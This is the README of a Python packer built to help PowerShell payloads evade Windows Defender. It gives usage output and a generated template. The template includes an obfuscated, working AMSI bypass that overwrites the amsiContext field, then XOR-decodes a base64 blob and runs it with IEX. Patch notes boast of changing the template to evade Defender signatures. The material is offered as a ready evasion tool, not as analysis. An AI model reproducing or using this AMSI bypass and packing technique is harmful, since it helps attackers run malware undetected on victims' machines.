# FuckThatPacker
A simple python packer to easily bypass Windows Defender

# Basic usage

```
# python FuckThatPacker.py --help

  ___        _   _____ _         _   ___         _           
 | __|  _ __| |_|_   _| |_  __ _| |_| _ \__ _ __| |_____ _ _ 
 | _| || / _| / / | | | ' \/ _` |  _|  _/ _` / _| / / -_) '_|
 |_| \_,_\__|_\_\ |_| |_||_\__,_|\__|_| \__,_\__|_\_\___|_|  
                                                          
                                                                      
Written with <3 by Unknow101/inf0sec
v1.0


usage: FuckThatPacker.py [-h] -k KEY -p PAYLOAD [-o OUTPUT]

optional arguments:
  -h, --help            show this help message and exit
  -k KEY, --key KEY     integer key use of XOR operation
  -p PAYLOAD, --payload PAYLOAD
                        path of the payload to pack
  -o OUTPUT, --output OUTPUT
                        output payload into file
```

# Exemple

Basic generation of xor payload :

```
# python FuckThatPacker.py -k 32 -p /root/payload.ps1

  ___        _   _____ _         _   ___         _           
 | __|  _ __| |_|_   _| |_  __ _| |_| _ \__ _ __| |_____ _ _ 
 | _| || / _| / / | | | ' \/ _` |  _|  _/ _` / _| / / -_) '_|
 |_| \_,_\__|_\_\ |_| |_||_\__,_|\__|_| \__,_\__|_\_\___|_|  
                                                          
                                                                      
Written with <3 by Unknow101/inf0sec
v1.0


[+] Encode UTF16-LE
[+] Cyphering Payload ...
[+] Base64 Payload
[+] Writting into Template
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField(("{1}{2}{0}" -f ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x41414141)
$a = "395zIEUgVCANIHMgVCBS[...]iBdICog"
$b = [System.Convert]::FromBase64String($a)
for ($x = 0; $x -lt $b.Count; $x++) {
                $b[$x] = $b[$x] -bxor 32
        }
IEX ([System.Text.Encoding]::Unicode.GetString($b))
```

# AV Results

![AV detection](https://i.ibb.co/fdQJD4Y/Screenshot-1.png)

#Patch Notes
13/11/2020 : Modifying template.txt for Defender signature :D
